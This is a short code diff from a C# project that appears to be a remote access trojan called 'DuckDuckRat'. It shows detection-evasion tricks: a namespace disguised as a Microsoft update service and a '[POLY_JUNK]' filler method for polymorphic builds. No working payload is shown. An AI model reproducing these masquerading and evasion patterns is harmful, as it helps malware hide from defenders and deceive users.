@@ -10,14 +10,14 @@ using System.Net.Http.Headers;
 using System.Net;
 using System.Threading.Tasks;
 using Newtonsoft.Json.Linq;
-using FinalBot;
+using DuckDuckRat;
 
 namespace Microsoft.UpdateService.Modules
 {
     public class ChatService
     {
         // [POLY_JUNK]
-        private static void _vanguard_6d0eda82() {
+        private static void _DuckDuckRat_6d0eda82() {
             int val = 38844;
             if (val > 50000) Console.WriteLine("Hash:" + 38844);
         }
@@ -314,3 +314,5 @@ namespace Microsoft.UpdateService.Modules
         }
     }
 }
+
+
